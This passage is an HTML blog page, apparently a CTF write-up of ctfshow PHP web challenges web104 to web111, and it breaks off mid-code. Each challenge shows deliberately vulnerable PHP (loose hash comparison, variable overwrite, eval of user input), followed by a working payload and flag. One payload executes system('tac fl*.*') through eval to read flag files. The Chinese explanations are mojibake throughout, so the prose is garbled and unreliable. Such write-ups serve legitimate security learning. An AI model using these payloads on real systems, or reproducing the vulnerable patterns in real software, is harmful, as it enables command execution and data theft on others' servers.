class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°ä½¿ç”¨äº†sha1å‡½æ•°å¯¹v1å’Œv2çš„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œæ ¹æ®å…ˆå‰çš„ç»éªŒå…ˆå°è¯•ä¼ è¿›æ•°ç»„ï¼Œç»“æœå‘ç°sha1æ— æ³•å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œpayloadå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>postv1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸæ‹¿åˆ°flagï¼šctfshow{d77537b8-fb35-41d9-bb21-ceddb710a839}</p><h4 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é¢˜å¾ˆæ˜æ˜¾å°±æ˜¯ä½¿ç”¨å˜é‡è¦†ç›–ï¼Œä½†å‘ç°å¯ä»¥è¾“å‡ºflagçš„åœ°æ–¹æ€»å…±æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯die($error),ç¬¬äºŒä¸ªå°±ç®—die($suces),ä¹Ÿå°±æ˜¯è¯´åº”è¯¥æœ‰ä¸¤ç§æ–¹æ³•<br>ç¬¬ä¸€ç§ï¼š</p><p>é€šè¿‡getä¼ å‚å°†flagèµ‹ç»™ä»»æ„ä¸€ä¸ªè‡ªå‘½åçš„å‚æ•°(a)ï¼Œå½“ç»è¿‡ç¬¬ä¸€ä¸ªforå¾ªç¯ä¾¿å¯å¾—åˆ°$a=$flagï¼ŒåŒæ—¶é€šè¿‡postä¼ å‚ï¼Œå°†açš„å€¼èµ‹ç»™error,ç»è¿‡ç¬¬äºŒä¸ªå¾ªç¯ä¾¿å¯å¾—åˆ°$error=$a,åŒæ—¶æ»¡è¶³ifçš„æ¡ä»¶ï¼Œä¾¿å¯å¾—åˆ°die($flag)</p><p>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span>flagposterror<span class="token operator">=</span>a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¾¿å¯å¾—åˆ°flag:ctfshow{42f415f1-3f74-4ef9-b2e5-f73776c56a98}<br>ç¬¬äºŒç§æ–¹æ³•ï¼š</p><p>ï¼ˆçœ‹äº†å¤§ä½¬ä»¬çš„åšå®¢æ‰çŸ¥é“ï¼‰å°±æ˜¯é€šè¿‡getä¼ å‚ï¼Œå…ˆæŠŠflagèµ‹ç»™suces,ç„¶åå†æŠŠflagèµ‹äºˆä»»ä½•å€¼éƒ½å¯ï¼ˆä¸å¤ªæ˜ç™½ä¸ºä¹ˆè¦æŠŠflagçš„é‡æ–°èµ‹å€¼ï¼‰payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>suces<span class="token operator">=</span>flag<span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³å¯æ‹¿åˆ°flag</p><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°æ˜¯sha1å¼±æ¯”è¾ƒï¼Œæ‰€ä»¥ç»§ç»­ç”¨ä¼ è¿›æ•°ç»„å¾—åˆ°NULLè¿›è¡Œç»•è¿‡<br>payload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>postv1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æˆåŠŸæ‹¿åˆ°flagï¼šctfshow{ff006892-2331-47d9-8924-61d1c515c272}</p><h4 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>parse_str</strong>    ( string <code>$enc``o``ded_stri``n``g</code>   [, array <code>&amp;$re``s``u``l``t</code>  ] )<br>å‚æ•°</p><p><code>e``n``c``oded_s``t``rin``g</code></p><p>è¾“å…¥çš„å­—ç¬¦ä¸²ã€‚       </p><p><code>r``es``u``lt</code></p><p>å¦‚æœè®¾ç½®äº†ç¬¬äºŒä¸ªå˜é‡ <code>result</code>ï¼Œ       å˜é‡å°†ä¼šä»¥æ•°ç»„å…ƒç´ çš„å½¢å¼å­˜å…¥åˆ°è¿™ä¸ªæ•°ç»„ï¼Œä½œä¸ºæ›¿ä»£ã€‚ä¾‹å­ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span><span class="token punctuation">;</span><span class="token comment">// æ¨èç”¨æ³•</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// value</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arr'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// foo bar</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arr'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// baz</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†$v2[â€˜flagâ€™]=NULLå³å¯ï¼Œå†å°†v3ä½œä¸ºæ•°ç»„ä¼ è¿›å³å¯<br>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v3<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>postv1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>flag<span class="token operator">=</span><span class="token constant">NULL</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{6189fec9-0a12-4abe-9727-25df29d8c31c}</p><h4 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ere****g()</strong>Â å‡½æ•°æœç´¢ç”±æŒ‡å®šçš„å­—ç¬¦ä¸²ä½œä¸ºç”±æ¨¡å¼æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœå‘ç°æ¨¡å¼åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚æœç´¢å¯¹äºå­—æ¯å­—ç¬¦æ˜¯åŒºåˆ†å¤§å°å†™çš„<br><strong>strrev()</strong>Â å‡½æ•°åè½¬å­—ç¬¦ä¸²ã€‚</p><p><strong>i<strong><strong>n</strong></strong>tv<strong><strong>a</strong></strong>l()</strong>Â å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼</p><p>é€šè¿‡æŸ¥é˜…èµ„æ–™çŸ¥é“äº†%00å¯ä»¥å°†ereg()å‡½æ•°æˆªæ–­ï¼Œæ­£åˆ™è¡¨è¾¾å¼åªä¼šåŒ¹é…%00ä¹‹å‰çš„ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span>a<span class="token operator">%</span><span class="token number">00778</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºç»è¿‡strren()å‡½æ•°åä¼šå˜æˆ877%00aï¼Œå†ç»è¿‡intvalå‡½æ•°å–æ•´ï¼Œå¾—åˆ°877,ç­‰äº16è¿›åˆ¶çš„36d<br>æ‹¿åˆ°flagï¼šctfshow{771cf43b-74b1-434e-b31c-663f958c2e37}</p><h4 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œåˆå­¦åˆ°ä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹phpå†…ç½®ç±»ï¼Œè®©v1ä¸æŠ¥é”™ï¼Œv2æ‰§è¡Œå‘½ä»¤å³å¯</p><ul><li>Error</li><li>Exceptionï¼šå¤„ç†ç”¨äºåœ¨æŒ‡å®šçš„é”™è¯¯å‘ç”Ÿæ—¶æ”¹å˜è„šæœ¬çš„æ­£å¸¸æµç¨‹ï¼Œæ˜¯phpå†…ç½®çš„å¼‚å¸¸å¤„ç†ç±»</li><li>DirectoryIterator</li><li>SimpleXMLElement</li><li><strong>Reflect<strong><strong>ion</strong></strong>Cla<strong><strong>s</strong></strong>s</strong>Â æˆ–è€…Â <strong>R<strong><strong>e</strong></strong>f<strong><strong>lect</strong></strong>ionMethod</strong>Â éƒ½ä¸ºå¸¸ç”¨çš„åå°„ç±»ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªç±»çš„æ˜ å°„<br>payloadï¼š</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php">ä½¿ç”¨ä»¥ä¸Šä»»æ„ä¸€ä¸ªç»™v1å³å¯ï¼Œ<span class="token operator">?</span>v1<span class="token operator">=</span>Error<span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tac fl*.*"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‹¿åˆ°flagï¼šctfshow{446d9c56-452a-4b68-80bf-9824eb85090b}</p><h4 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆä¸€ä¸ªæ–°çš„çŸ¥è¯†ç‚¹ï¼ŒFilesystemIteratorç±»çš„ä½¿ç”¨(ä½œç”¨å°±æ˜¯è·å–å½“å‰ç›®å½•æ–‡ä»¶)<br>ï¼ˆDirectoryIteratorç±»è·å–ç›®å½•ï¼‰</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å†å¾—åˆ°ä¸€ä¸ªç‚¹æˆ–è€…è·¯å¾„å°±å¯ä»¥æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶,æˆ‘ä»¬ä½¿ç”¨getcwd()(è·å–å½“å‰ç›®å½•)</p><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>v1<span class="token operator">=</span>FilesystemIterator<span class="token operator">&amp;</span>v2<span class="token operator">=</span>getcwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘ç°ä¸€ä¸ªæ–‡ä»¶ï¼Œç›´æ¥è®¿é—®å³å¯<br><img src="/images/web_110.png"></p><pre class="line-numbers language-plain" data-language="plain"><code class="language-plain">å¾—åˆ°flagï¼šctfshow&#123;70e909b5-8f13-4938-ba8a-52f2a857d24d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span 